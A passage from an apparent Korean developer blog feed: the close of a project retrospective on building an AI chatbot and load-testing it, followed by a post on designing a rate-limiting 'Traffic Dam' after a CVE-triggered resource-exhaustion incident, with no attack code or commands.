<p>결론적으로 AI의 폭발적인 성장, 그리고 AI로 무언가를 하게 만드는 과정은 대단히 ‘신선했다’. 전부터 계속 기술에 대한 팔로우업을 했었고 그렇기에 구현도 생각보다 빠르게 가능했다. 그럼에도 막상 실제 개발 과정에서 보이는 ‘자연어 데이터’를 어떤 식의 접근으로 압축하고, 제시하고, 로직을 통해 작업하게 만드는 가, 또한 AI 에게 효과적으로 보여주느냐를 고려하는 이 과정은 개발자로서 0 아니면 1이라는 감각과는 다른, 보다 기획에 가까운 경험을 제공했다. 네트워크 관련 데이터 해석이 필요하다보니 function calling, mcp 연계 구현 등 아직 그 잠재력은 훨씬 늘어날 수 있다는 걸 생각하면, 앞으로 계속 백엔드이자 응용 어플리케이션을 위한 AI 개발의 감각과 기술에 대한 연습의 필요를 느낀 계기가 되었다. 
<img src="/assets/images/posts/2026-02/010.png" alt="" /></p>
<blockquote>
  <p>RAG 용 데이터 업로드를 위한 실시간 페이지</p>
</blockquote>

<p><img src="/assets/images/posts/2026-02/011.png" alt="" /></p>
<blockquote>
  <p>기억력 검증</p>
</blockquote>

<p><img src="/assets/images/posts/2026-02/012.png" alt="" /></p>
<blockquote>
  <p>RAG 에 없는 데이터는 출력하지 않음</p>
</blockquote>

<p><img src="/assets/images/posts/2026-02/013.png" alt="" /></p>
<blockquote>
  <p>RAG 적용 예시</p>
</blockquote>

<h4 id="도전을-방해하는-ai-도전의-허들을-허무는-ai">도전을 방해하는 AI, 도전의 허들을 허무는 AI</h4>
<p>마지막으로 개인적으로 확실하게 각인된 부분, 그것은 AI가 나라는 개발자에게 ‘무얼 해줄 수 있고’ 반대로 ‘무얼 방해하는가’라는 부분이다.</p>

<p>1달, 풀스텍의 개발과정의 도전은 꽤나 고무적이지만, 겉으로 보기에 그렇지 결국 좌절의 연속과 망설임의 연속이었다. 새로운 것을 배운다는 자를 계속하고, 치열해진다는 것은 정신력의 소모가 너무 심한 일이였다. 이 때 AI 기반으로 새로운 k8s의 도입을 실패하고, 목표를 위해선 몇 달 공부하고 씨름하던걸 내려 놓아야 한다는 판단이 들었을 때는 끔직했다. 또 그렇고 나니 새로운 걸 배우는게 더 큰 실패를 불러올까 싶어 두려웠다.</p>

<p>AI는 예민한 고가용성 도구들의 헬름차트들을 위한 스크립트를 짜준다. 아마도 ‘딸깍’하고 해결해줄것 같았다. 실제로 구버전에 대해선 어렵지 않게 쓰는것이 가능할 거라 판단된다. <strong>하지만 기술의 발전, 그 속도에 못 따라가고 있었다. 과거의 것도 가져왔지만 결국 ‘그럴 듯한 스크립트’지, 100% 현재 구동 되는 걸 가져온 것도 아니다</strong>. 결국 스스로 배우고, 최신의 버전으로 엔터프라이즈급 구현을 하기엔 충돌이나, 최신에선 기존의 오픈소스 정책이 폐지되거나, 저장소 위치가 달라지는 등의 문제를 그대로 스스로 떠 안아야 했다.</p>

<p>이때 AI 의 구조상의 한계는 명확하다. AI는 여전히 ‘그럴 듯 하게’ 짜는 건 가능했지만, 복잡한 실무 수준의 그것을 하기엔 단순하게 요청-받기 하는 식으론 어렵다. 결국 인프라의 상태를 인지하지 못하는 stateless 한 조언자로서 명백한 한계를 가진다. 그리고 그 극단적인 예시가 최신의 k8s 도입 실패며, 이때 필요한 건 현재의 가장 최신에 확실한 문서를 통한 교차 검증, 사람을 통한 맥락의 이해였다.</p>

<p>그러나 <strong>동시에 새롭게 배우는데 도구로서 AI는 최상의 파트너이자, 다음 수준으로 올라가기에 적절한 도구였다.</strong> 간단한 예시 코드를 가져와 돌려보고, 핵심을 파악하고 새로운 것을 도입하는데 있어서는 AI 만한게 없었다. FastAPI 에서 OpenAI 의 API 구로 OpenRouter 를 연결하고, Redis 를 기반으로 message를 활용한 접근 법을 도전한다던지, 예전 같다면 새로운라이브러리 하나에 최소 일주일 ~ 한달은 걸릴 것을 3일에서 일주일 안에 해결하도록 만들었다.</p>

<p>이러한 것이 가능했던 이유는, 스스로 접근하려면 공식 문서를 한땀한땀 데모 부분을 읽고 판단해야 했지만, 그러한 영역을 포함해 데이터의 압축, 이해도, 소화력을 한꺼번에 올릴 수 있도록 돕는 AI는 이번 프로젝트를 성공적으로 마무리 할 수 있던 이유라고도 할 수 있겠다.</p>

<p>결과적으로 AI 는  방해하긴 했지만, 반대로 도와주기도 했다. AI 는 중립 그 자체이며, 임팩트도, 한계도 명확했다. 그러니 문득 이런 생각을 하게 되었다. ‘AI’ 는 돈, 혹은 공공재와 같은 것이지만 특히나 여기저기 도움이 되는 도구다. 그렇다면 이것은 일종의 중립적인 도구이며, 지금은 새로운 ‘수단’을 발견했기에 열광하지, 이것으로 답을 끝내는 것은 웃긴 생각이라고 판단이 섰다. 왜냐면 아무도 돈이 많다고 그걸로 끝이라고 하지 않으며, 금이 많다고 끝이라고 하진 않는다. 그걸 써서 무언가 하는 사람의 결과가 결국 그 가치를 빛내게 만드는 것이다. 어쩌면 AI의 영역은 늘어나고, 코드의 가치는 줄어 들겠지만, 시스템 전체에 대한 통합자, 문제의 정의자로의 역할이 개발자가 할 일이 되지 않을까? <strong>결국 ‘개발자의 가치’는 그 의미를 달라질지언정 그것의 존재가 사라지진 않을 것이란, 명확한 확신을 가지게 되었다.</strong></p>

<h3 id="what-i-missed">What I Missed</h3>
<h4 id="데이터-한-끗이-실수를-만든다">데이터, 한 끗이 실수를 만든다</h4>
<p>내가 실수 했던 영역을 정리해보면, 그렇다. 가장 뼈아픈 부분이 바로 데이터에 대한 부분이었다. SRE(Site Reliability Engineering)라는 키워드를 아는가? 사이트 신뢰성 공학, 운영에서 문제들을 수동 작업이 아닌 코드로 해결하고, 확장성을 세우는 것. 특히 허용 가능한 장애 범위를 이해하고, 트래픽 용량 계획을 세우는 등으로 필요한 대응이 미리 산정되고 준비되며, 지속적으로 이러한 구성 형태로 가용성과 성능을 관리하는 방법론이다. 이번 프로젝트 직전 처음, 트래픽에 대한 개념을 이해했고, Scale-Out 으로 진짜 대응이 되는지를 검증하자! 라는 생각을 하게 되었을 때 디테일하게 이를 이해하게 되었다. 또한 백엔드 개발자라고 표방한다면 무엇보다도 SRE 라는 것이, 가장 현실적이자, 이성적인 서비스 운영 방법론으로 이해하는게 필요하지 않을까 생각했다.</p>

<p>그리하여 열의에 찬 나는 k6, AI, 온프레미스 하드웨어, 모여있는 것들을 기반으로 테스트를 돌려보았다. 핵심 로직을 그대로 모사하고, AI worker 를 통한 실제 토큰까지 받아내면서 가상 유저(Vu)의 핸들링을 기록했다. 그렇게 쌓인 결과들은 확실히 서버에 대한 ‘감’을 늘려주었으며, 특정 수준에서 병목이 발생하거나, 특정 방법에는 매우 쉽게 핸들링 하는 이러한 특성들을 이해할 수 있었다.</p>

<p>하지만 데이터를 읽는데는 실패했다. 최초 Before 테스트라고 Traffic Dam 이 구축 되기 전, 기초만 설정한 상태에서 테스트를 진행하고 이를 결과로 만들었다. 기준을 그걸로 잡은 이후엔 Traffic Dam 을 설정하고 두번 째 테스트를 했으며, 이에 따라 결과를 도충하고자 했다. 분명 500명은 처리가 되었다고 생각했는데, AI TTFT(최초 토큰 발행)이 before 테스트에서 비정상이었고 이를 놓쳤다. <strong>초기 RPS와 에러율과 같은 겉보기 지표(Vanity Metrics)에 집중하느라, 직접 AI TTFT 를 재고, 지연시간 까지 측정하도록 했으면서도 제대로 해석을 하지 않았다.</strong> 그렇기에 애초에 지금 구조론 테스트를 하면 안되는 것이었고, Before 테스트의 수치 및 쌓은 데이터는 ‘<strong>쓰레기</strong>‘가 되었다.</p>

<p>아찔 했다. 몇 일을 날린 데이터는 의미도 없는 것이었고, 선택이 필요했다. 결국 아주 기본적으로 이해할 수 있는 서버에 대한 내용을 제외하면 모든 Before Test 는 폐기. 그 결과 다시 로직을 전체를 수정, 제대로 동작할 수 있도록 구성을 하고 나서야 After 테스트를 진행하고 제대로된 데이터를 도출했다. 그러나 알다시피 이는 결국 Before 테스트에서 이미 가설 설정부터 잘못된 상황이었으니, ‘가설을 검증’한다는 목적에 부합하진 못 했다.</p>

<p>이렇게 된 핵심은 단 하나. 데이터를 해석하는 과정에서 ‘<strong>제대로 보지 못했다는 점</strong>’. 각 요소들의 연관 관계를 고려하지 않고, AI와 함께 빠르고 간단하게 생각했던 것으로 결과적으로 Before Test 의 가치는 쓰레기가 되었던 것이다. 그나마 한바탕의 작업을 하고 난 뒤에야 다시 트래픽의 기준치를 파악, 서버 1대 당 실제 얼마나 처리가 가능한지 등을 구체화 할 수 있었다. 그리하여 현재 시스템 상, 스케일 확장 시 코어 당 0.86 수준의 효율을 유지할 수 있다는 <strong>선형 확장의 한계 및 예측 가능한 스케일 아웃 개념(용량 = 최소 기준 * N * 0.83)까지 도달</strong> 할 수 있었다.</p>

<p>그러나 결론적으로 잘 된건 아니었다. SRE 라는 멋진 척은 다했지만,  결국 SRE 란 단어를 쓰는게 개발자가 아니라, <strong>데이터 무결성. 지표 간의 상관관계를 의심하고 데이터의 무결성을 증명하는 과정이 개발자의 과정임을 깨달았다.</strong> 데이터를 제대로 읽지 못한 순간 벌어진 작업들과 잘못된 방향성은 더 많은 시간을 쓰도록 만들었다. 이것이 개인 프로젝트이니까 다행이지, 만약 팀 프로젝트였다면? 보다 디테일한 거대 시스템이었다면? 더 말할 것은 없는 <strong>뼈아픈 실책</strong>이었다. <strong>백엔드 개발자의 ‘데이터’를 바라 보는 시각, 해석역량은 정말 중요한 것이었다.</strong></p>

<p><img src="/assets/images/posts/2026-02/014.png" alt="" /></p>

<p><img src="/assets/images/posts/2026-02/015.png" alt="" /></p>
<blockquote>
  <p>나름 최선을 다해 모니터링을 해보았으나…. 결국 핵심은 모니터링 데이터를 ‘내가 어떻게 보는가’ 였다.</p>
</blockquote>

<h4 id="ai의-시너지는-인간이다">AI의 시너지는 인간이다</h4>
<p>두번 째 큰 실수는 이전에도 언급했듯 k8s 를 제대로 적용, 도입하지 못했단 사실이다. AI 에 과도하게 의존하고 접근한 첫 시작. AI 의 한계가 뭔지를 몰랐고, 도전과 적용 과정에서 예상을 뛰어넘게 빈틈이 많았다. 결국 <strong>AI에 의한 ‘그럴듯한 오답’에 휘둘린 셈</strong>이다. 모니터링 서비스 구축시 고가용성을 보장하는 헬름차트를 추천하는 AI의 말을 철썩 믿었다가, 호환성 문제와 스크립트의 문법이 버전마다 달라질 수 있다는 사실을 몰랐다. 차라리 필요한 서비스들을 먼저 만들어보고, 그 뒤에 고도화로 접근했으면 될 것을 과도한 욕심으로 결국 지지부진, 진전 없는 도전, AI와의 씨름만을 이어가게 만들었고, 결과적으로 기간의 문제로 프로젝트에 도입을 내려놓게 되었다.</p>

<p>만약 공식 문서, 레포지터리를 더 정확하게 판단했다면? 단순히 AI 의 제안으로 끝이 아니라, 직접 도입의 trade-off 를 좀더 고려했다면? 분명 k8s 를 기반으로 최소한 70 ~ 80점 짜리 구축이 가능했을 것이며, 80점은 90점이 100점이 될 가능성이 생긴다. <strong>0점이 나오면, 그건 그 상태에서 목표를 달성하기 위한 예상 외의 요소가 너무 많다.</strong></p>

<p>또한 그 외에 <strong>AI에 대한 중요한 부분. 그것은 AI의 특성을 고려한 문서, 작업 요청을 할 수 있어야 한다는 점이다.</strong> 그리고 거기서 ‘무엇을 할 수 있나’, 즉 다시 한 번 공식 자료들을 수집하고, 그 안에서 보다 디테일하게 AI 가 작업하게 만들었어야 에러를 찾고, 해결하기도 쉽고, 근본적으로 클린한 AI를 기반으로 한 생산이 가능하다.</p>

<p>AI 는 요구사항이 디테일할 수록, 그 요구가 정확한 지식에서 베이스가 되면, 맡긴 작업에서 문제가 뭔지도 빨리 캐치가 가능하며, AI 가 구현을 할 때도 정확한 구현이 된다. 하지만 <strong>그게 아니라 일단 만들고 보는 방식은, 내부의 AI 가 뭘 써서 만들었는지를 블랙박스화 시켜 버리고 만다.</strong> 특히 신기술, 새로나온지 얼마 안된건 AI 조차 학습이 안되어 있는데, 결국 이런 것들이 한개, 두개씩 쌓이니 결국 나중엔 거대한 비효율이 되고, 프로젝트의 개발 속도를 저해시키는 요소로 방해했다.</p>

<p>결과적으로, AI가 생겼다고, 검색도 확인도 AI에서 다 하고 끝내면 된다는 생각. 그 생각을 버리는 것이 필요하다고 느꼈다. <strong>인간의 정확한 가이드, 기술에 대한 교차 검증과 맥락에 대한 소유권을 가지는 것, 이것이 AI 의 효과를 극대화 시키고, 실수를 최소화 한다. 그런 점에서 공식 문서들을 반드시 확인하는 태도, AI와 시너지를 너는 가장 첫 번째 태도임을 뼈저리게 느꼈다.</strong></p>

<h3 id="what-is-the-next-step">What is the ‘Next Step’</h3>

<h4 id="k8s-클러스터링-gitops-보다-현대적-구조로">K8s, 클러스터링, GitOps, 보다 현대적 구조로</h4>
<p>Docker 기반으로 구축한 온프레미스 서버 2대, 그 사이에 모니터링과 비즈니스 로직, 그리고 AI 까지. 한달이란 시간을 진짜 전력으로, 가능한 모든 시간을 할애하여 고민하고 설계하고 작업을 하는 과정은 정말 숨이 막혔다.</p>

<p>하지만 점점 그렇게 하나씩 해결해 나가고, 처음엔 ‘언제 다 하지’라고 생각했던 것들이 이겨 나가고, 다시 정신을 차리고, ‘조금만 더’라는 키워드와 함께, 한 단계를 마무리 할 때마다 ‘상쾌함’을 느꼈다. 그렇게 소소한, 지금 이 단계에서의 상쾌함, 절망, 그 루프를 몇 차례나 돌았을 까. 결국 1달이란 시간은 다 지나가고, 프로젝트를 마무리하여, 챗봇을 구축하고, 그 챗봇은 기억도 하며, 데이터를 가지고 정확한 지표를 나 대신 설명해줄 수 있게 되었다.</p>

<p>그렇게 하는게 러너스 하이라고, 생각하는 한 편, 그렇기 때문에 DevOps 에 대한, 백엔드에 대한 아쉬움이 다시 보이기 시작했다. 예를 들면 k8s 에 대해 그 뒤로도 틈틈히 공부를 진행했지만 이제는 Docker 가 내부에서 표준으로 돌아가지 않으며 CRI(Container Runtime Interface)를 지원하는 containerd, CRI-O 가 돌아간다는 사실을 알게 되었다. 이는 더 가벼우면서도, Docker가진 단점들을 개선하는 역할을 해줌을 알게 되었다.</p>

<p>뿐만 아니라 이전 직장에서의 구현을 더 강화한, 스스로를 증명하기 위한 시스템 구축이긴 했지만, 막상 구현하고 보니 무중단 배포, 롤백 대응 등으로 불필요한 컨테이너 전략. 리소스를 보다 최적화 시킬 수 있다는 점. 그렇게 했을 때 보다 많은 서비스를 올리거나 보다 안정적인 서비스를 구현할 수 있을것 같다는 직감은, 러너스 하이 이후의 그 앞을 더 바라봐야겠구나 하는 생각을 하게 되었다.</p>

<p>그래서 다음, 기존 서비스를 개선하고, 동시에 다음 프로젝트를 위한 자양분이 될 서비스 구성을 해볼 생각이다.</p>
<ul>
  <li><strong>k8s 를 기반으로 온프레미스 서버를 ‘클러스터링’하여서 한대의 PC에서 동작하듯 제어 가능하도록 구축한다.</strong></li>
  <li><strong>ArgoCD의 도입은, 선언적 상태 관리로 전환, 인프라의 정합성을 보장하는 GitOps의 파이프라인을 완성하고자 한다.</strong></li>
  <li><strong>ArgoCD 기반으로 기존의 Green/Blue 전략이 아닌 좀더 능동적으로 무중단 배포가 가능하며, 지금 이상의 리소스 최적화 전략, 스케일 확장이 접목된 형태로의 개선을 진행하고자 한다.</strong></li>
  <li><strong>궁극적으로 K8s 기반으로 Traffic Dam, RAG 파이프라인, Observability 스택 등을 표준화한 탬플릿으로 구축함으로써, 진정한 Full-Cycle Engineering Platform을 세우는 것, 이것을 Nexus 프로젝트의 핵심 목표로 한다.</strong></li>
  <li><strong>나아가 해당 플랫폼은, 향후 있을 개인의 다양한 프로젝트를 위한 모판으로의 구색을 갖춰둘 생각이다.</strong></li>
</ul>

<h3 id="conclusion">Conclusion</h3>
<p>한달은 짧았다. 위에서도 언급했지만 벅차고, 두렵고, 사실 불안이 가장 컸다. 지금도 아쉬움이 남는 만큼, 과연 내가 실무의 경험치 면에서 진짜 전문가인가? 라는 질문에 답이 될지 확실하게 ‘그렇다’라는 긍정 표현을 하기엔 뭔가 아쉽다.</p>

<p>그럼에도 AI 를 이해하고, DevOps 를 경험하고, 성취를 맛보면서 궁극적으로 ‘확신한’것은 내 ‘성장 가능성’, 그리고 좀더 치밀하게, 좀더 현명해질 수 있다면 분명 그 다음, 더 고도의 기술을 제어하고, 더 안정적으로 거대 시스템을 다룰 수 있으리란 확신이 섰다.</p>

<p>많은 이들은 두렵다고 하고, 당연히 일자리의 소멸, AI의 대체는 개발자까지도 대체할 거란 부분이 계속 튀어나오고 있다. 나도 이러한 두려움은 허상은 아니라고 생각한다. 하지만 반대로 말하면 AI에 대한 높은 이해도, AI를 통한 시너지를 내는 사람이 된다면, 이건 반대로 내가 남들 이상의 임팩트를 낼 수 있으며, 또 그런 이해가 필요한 이들에게 도움을 줄 수 있는 기회라고 생각한다. 결국 언제나 위기였지만, 위기는 위기니까 기회가 되고, 좁은 문을 뚫는 사람은 필요한 법이 아니겠는가? 이번 기간은 정말 상쾌한 개발 기간이었고, 회복의 기간이었다. 다시 개발자로서 달릴 수 있으리란 생각을 하게 된다.</p>

<p>백엔드 개발자의 본질, <strong>구현 만이 아닌 복잡한 시스템의 상호작용을 설계하고, 데이터의 흐름을 제어-통찰을 끌어내며, 비즈니스 임팩트를 기술로 증명하는 것.</strong> 그 본질에 조금 다가간 시간이 아니었나? 조심스럽게 생각해보게 된다.</p>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><category term="Protostar" /><category term="Toss" /><summary type="html"><![CDATA[Learner’s High 2nd Epilogue]]></summary></entry><entry><title type="html">Traffic Dam 구성기, 고가용성 씨앗을 심어보자</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/01/09/00-project-protostar-traffic-dam.html" rel="alternate" type="text/html" title="Traffic Dam 구성기, 고가용성 씨앗을 심어보자" /><published>2026-01-09T00:00:00+00:00</published><updated>2026-01-09T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/01/09/00-project-protostar-traffic-dam</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/01/09/00-project-protostar-traffic-dam.html"><![CDATA[<h2 id="chapter-1-traffic-dam-구현기-summary">Chapter 1 Traffic Dam 구현기 summary</h2>

<p>SRE 기반의 유량 제어 시스템을 품은 풀스택 AI 챗봇 구현을 진행했다. Protostar 의 Prototype 에 해당하는 것 + 이에 필요한 트래픽제어기를 구현했던 내용을 기록화 시켰다.</p>

<h3 id="1-핵심-성과">1. 핵심 성과</h3>

<h4 id="한-줄-요약"><strong>한 줄 요약</strong></h4>

<p><em>개인 프로젝트 Protostar 의 개발 중 온프레미스 서버에 <strong>CVE-2025-55182 취약점을 악용한 공격으로 CPU 자원 포화(Resource Hijacking, 800%) 발생 및 전체 서비스 불능 상태 경험</strong></em></p>

<p><em>시스템 보호를 위한 <strong>Traffic Dam</strong> 에 대한 필요성, 서비스를 위한 <strong>적정 용량 산정(Capacity Planning)</strong> 의 필요성 절감</em></p>

<p><em>검증을 위한 <strong>풀스택 AI 챗봇 구현</strong> 및 <strong>VU 1000 에서 에러율 0% 달성</strong> 및 <strong>예측 가능한 스케일 아웃의 기준 공식</strong> 도출</em></p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">카테고리</th>
      <th style="text-align: left">Before</th>
      <th style="text-align: left">After</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">**안정성**</td>
      <td style="text-align: left">Rate Limiter 없음, 공격 시 전체 시스템 다운 혹은 느려짐</td>
      <td style="text-align: left">1,000 VU에서 에러율 0%</td>
    </tr>
    <tr>
      <td style="text-align: left">**확장성**</td>
      <td style="text-align: left">단일 인스턴스 600 VU 한계</td>
      <td style="text-align: left">스케일 아웃으로 1,000 VU 안정 처리</td>
    </tr>
    <tr>
      <td style="text-align: left">**운영 예측성**</td>
      <td style="text-align: left">용량 산정 기준 없음</td>
      <td style="text-align: left">실제 용량 = 기준 × N × 0.83 공식 도출</td>
    </tr>
  </tbody>
</table>

<h4 id="핵심-수치"><strong>핵심 수치</strong></h4>

<ul>
  <li>온프레미스 핵심 비즈니스 로직 단일 인스턴스 조합에서의 트래픽 최적의 스윗 스팟 측정 : VU 600 기준</li>
  <li>서버 리소스를 고려한 스케일 아웃 2배 진행
    <ul>
      <li>동시 사용자: 600 → 1,000 (67% 증가)</li>
      <li>p95 레이턴시: 2.79초 (목표 3초 이내 달성)</li>
      <li>스케일 아웃 효율 구체화: 83% (선형 대비)</li>
    </ul>
  </li>
</ul>

<p><img src="/assets/images/posts/2026-01/20260109-002.png" alt="" /></p>

<p><em>블로그 상에 구현되 챗봇 데모</em></p>

<p><img src="/assets/images/posts/2026-01/20260109-003.png" alt="" /></p>

<p><em>서비스를 위한 데모 프론트엔드 페이지</em></p>

<hr />

<h3 id="2-문제--해결--인사이트">2. 문제 → 해결 → 인사이트</h3>

<h4 id="why-문제-정의"><strong>Why: 문제 정의</strong></h4>

<p>개인 프로젝트 개발 도중 React Shell 취약점(CVE-2025-55182)으로 L7 공격을 받았다. 인프라를 구축만 하고 프론트 데모만 있었기에 Rate Limiter가 없었다. 무한 요청이 그대로 Next.js 서버로 들어왔고, 전체 시스템은 리소스 부족으로 시스템이 무너졌다. 처음으로 서버의 과부하를 경험하였다. 프론트엔드 취약점이었지만, 피해는 백엔드와 인프라까지 영향을 주었다.</p>

<p>그렇기에 질문이 생겼다.</p>

<p><strong><em>“취약점은 언제든 발생할 수 있다. 그때 시스템은 어떻게 버텨야 하는가?”</em></strong></p>

<p><strong><em>“트래픽의 대응을 위한 스케일 아웃을 어떻게 해야 하는가?”</em></strong></p>

<p><strong><em>“구현한 서비스가 데모이든 무엇이든 최적의 성능을 제공해주는 기준이 필요하다”</em></strong></p>

<h4 id="what-해결-목표"><strong>What: 해결 목표</strong></h4>

<p>Protostar 서비스 구현 도중 일어난 사건들, 백엔드 개발자로서 제대로된 서비스를 구현하기 위해선 반드시 이 작업이 필요하다고 느꼈다.</p>

<p>핵심 가설을 세웠다.</p>

<p><strong><em>“초당 5,000개의 악의적 요청이 들어와도, 백엔드는 초당 100개만 처리하며 죽지 않을 수 있을까?”</em></strong></p>

<p>이를 검증하기 위해 Traffic Dam을 설계했다. 댐이 물을 막고 조절하듯, 트래픽을 받아내고 제어하는 시스템을 구축하는 것을 목표로 삼았다.</p>

<h4 id="how-설계-및-구현"><strong>How: 설계 및 구현</strong></h4>

<h5 id="아키텍처"><strong>아키텍처</strong></h5>

<p><img src="/assets/images/posts/2026-01/20260109-004.png" alt="" /></p>

<p><em>서비스 아키텍쳐, 온프레미스 제약을 해결하는데 시간이 걸렸다</em></p>

<p>기존 설계와 인프라, 모니터링 구축이 끝난 직후였다. 구현의 목표는 풀스택 AI Chatbot 의 데모를 구현 + Traffic Dam 을 설계하여 목표에 답을 하는 것이다.</p>

<ul>
  <li><strong>Gateway Layer (NestJS):</strong> 대규모 연결 유지, 1차 트래픽 방어, SSE 기반 실시간 스트리밍</li>
  <li><strong>Buffering Layer (Redis/BullMQ):</strong> 트래픽 임시 저장, Token Bucket Rate Limiting, Backpressure 대응 도구</li>
  <li><strong>Processing Layer (FastAPI):</strong> LLM 처리, OpenRouter API 연동, 고정 처리량 제어</li>
</ul>

<h5 id="핵심-구현-사항"><strong>핵심 구현 사항</strong></h5>

<table>
  <thead>
    <tr>
      <th style="text-align: left">영역</th>
      <th style="text-align: left">구현 내용</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">**실시간 통신**</td>
      <td style="text-align: left">SSE 기반 채팅 스트리밍, Redis List 기반으로 멀티 인스턴스 간 메시지 동기화</td>
    </tr>
    <tr>
      <td style="text-align: left">**트래픽 제어**</td>
      <td style="text-align: left">Nginx 의 Sliding Window Rate Limiting, Token Bucket Rate Limiting, Max Concurrent Connection(1,000), Job Deduplication</td>
    </tr>
    <tr>
      <td style="text-align: left">**장애 대응**</td>
      <td style="text-align: left">Circuit Breaker 패턴</td>
    </tr>
    <tr>
      <td style="text-align: left">**Observability**</td>
      <td style="text-align: left">cAdvisor, node-exporter, Winston  Loki 통합, JSON 구조화 로깅, 레이어별 에러 추적, Grafana 모니터링 시스템, Discord 기반 Alert 체계</td>
    </tr>
    <tr>
      <td style="text-align: left">**인프라**</td>
      <td style="text-align: left">Docker Compose 기반 스케일 아웃, Nginx 로드밸런싱, Jenkins CI/CD(Zero-Downtime, G/B 전략)</td>
    </tr>
    <tr>
      <td style="text-align: left">**AI 서비스**</td>
      <td style="text-align: left">OpenRouter 기반 LLM 연동, Protostar 프론트엔드 데모 구현</td>
    </tr>
  </tbody>
</table>

<h5 id="개발-방식-ai-assisted-development"><strong>개발 방식: AI-Assisted Development</strong></h5>

<ul>
  <li>초기에는 <strong>Antigravity + Gemini</strong> 조합으로 개발 및 배포 전 <strong>CodeRabbit AI</strong> 를 활용한 검토 파이프라인 구축. <strong>Obsidian</strong> 은 단순 지식 저장용</li>
  <li>중반부터 <strong>Obsidian + Claude Code</strong> 체제를 추가 도입.</li>
</ul>

<p><img src="/assets/images/posts/2026-01/20260109-005.png" alt="" /></p>

<p><strong>개선 이유?:</strong></p>

<ul>
  <li><strong>생산성 증대</strong>: 코드 작성과 문서화를 하나의 흐름에서 처리가 가능하며, AI와 함께 공유가 가능함.</li>
  <li><strong>데이터 해석력 확보</strong>: k6 테스트 결과 분석, 병목 원인 추론에서 Claude의 정확도가 높았고, 이를 체계적으로 파이프라이닝이 필요, CMD + C / CMD + V 는 너무 비효율적임.</li>
  <li><strong>설계 검증</strong>: 내 관점의 설계안에 대해 헛점, 사이드 이펙트, 엣지 케이스를 함께 검토</li>
</ul>

<p>AI를 단순하게 “<strong>코드 생성기</strong>“로 보면 안된다고 판단하였다. “빠른 도입 가속기”로 활용했다. 내가 방향을 잡고, AI를 통해 허점을 지적하도록 하여 새로운 기술에 대한 적응력을 높이고, 아키텍쳐의 기술 선택에서 가능한 최적의 선택을 도모하도록 했다.</p>

<h5 id="result-검증-결과"><strong>Result: 검증 결과</strong></h5>

<p>k6 기반 부하 테스트로 검증. 온프레미스 서버에서의 최대 트래픽 수치를 구체화 하였다.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">구성</th>
      <th style="text-align: left">VU</th>
      <th style="text-align: left">에러율</th>
      <th style="text-align: left">Latency(p95)</th>
      <th style="text-align: left">AI TTFT(p95)</th>
      <th style="text-align: left">RPS</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">**단일(NestJS 1 + FastAPI 2)**</td>
      <td style="text-align: left">500</td>
      <td style="text-align: left">0%</td>
      <td style="text-align: left">710ms</td>
      <td style="text-align: left">849ms</td>
      <td style="text-align: left">173.18/s</td>
    </tr>
    <tr>
      <td style="text-align: left">**2배 (NestJS 2 + FastAPI 4)**</td>
      <td style="text-align: left">1,000</td>
      <td style="text-align: left">0%</td>
      <td style="text-align: left">2.79s</td>
      <td style="text-align: left">3084ms</td>
      <td style="text-align: left">287.77/s</td>
    </tr>
  </tbody>
</table>

<ul>
  <li><strong>VU 1,100 이상에서 429 에러가 발생하기 시작</strong>했고, 이는 Rate Limiter가 의도대로 작동하여 <strong>시스템을 보호하도록 구현 완료</strong></li>
  <li>전체 시스템은 스케일 아웃이 되었으나, <strong>Redis 는 단일 인스턴스로 병목이 발생</strong>했음. 이에 메시지 처리 과정의 <strong>I/O 경합이 AI TTFT 의 지연의 주 원인으로 분석</strong>됨(Latency Trade-off)</li>
</ul>

<h5 id="insight-배운-것"><strong>Insight: 배운 것</strong></h5>

<ol>
  <li><strong>스케일 아웃은 선형이 아니다:</strong> 2배 확장에 83% 효율. Nginx 로드밸런싱 불균형, 공유 자원 경합, 네트워크 오버헤드가 원인이었다.</li>
  <li><strong>Baseline 설정과 Capacity 에 대한 구체화:</strong> 단일 코어당 핵심 로직을 거쳐 NestJS, Redis, FastAPI 로 작업을 처리 시 얼마나 걸리는 지를 파악할 수 있었고, 기록을 기반으로 실제_용량 = 기준_용량 × N × 0.83 라는 수식을 도출. 스케일 아웃 시 얼마나 트래픽을 처리할 수있을지 예상치를 설정하고, 기준을 보다 명료하게 만드는 것에 성공하였다.</li>
  <li><strong>설계적 Stateless ≠ 집합체적 Stateless:</strong> In-memory Session, Redis 공유 카운터 등 암묵적 상태 의존성이 존재했고, Sticky Session 전략이 필요했다. 구조에 대한 이해도가 얼마나 중요한지 느낄 수 있었다.</li>
  <li><strong>동일 에러 코드, 다른 원인:</strong> 같은 429라도 Nginx L7에서 발생한 것과 Application에서 발생한 것은 달랐다. Observability 없이는 디버깅이 불가능했기에 모니터링의 필요성, 로깅의 디테일의 중요성을 느꼈다.</li>
  <li><strong>AI는 도구다:</strong> AI 는 복잡한 시스템의 상호작용과 DevOps 의 미세한 맥락을 이해하지 못했다. 이에, 방향(Why &amp; What)의 결정자는 나이자, 제안자는 AI 라는 형태로 설정하였다. 구현(How)은 AI 와 함께 진행하였다. 이때 ‘나’는 공식 문서와, 각 기술들의 최신 맥락을 교차검증하였으며, AI를 일종의 ‘기술 제안자’ 이자 ‘빠른 프로토타이퍼’로 세워 ‘망설이는 시간’을 획기적으로 줄일 수 있었다. 이를 통해 1인 개발의 한계를 넘는 복잡도를 이해하고, 풀스택 서비스 구현과 검증까지 진행 가능하였다.</li>
</ol>

<hr />

<p><img src="/assets/images/posts/2026-01/20260109-006.png" alt="" /><br />
<em>Grafana - Before 테스트 당시 컨테이너 상태</em></p>

<p><img src="/assets/images/posts/2026-01/20260109-007.png" alt="" /><br />
<em>Grafana - After 테스트 당시 두배 스케일 아웃 된 서버들이 병렬로 대응함</em></p>

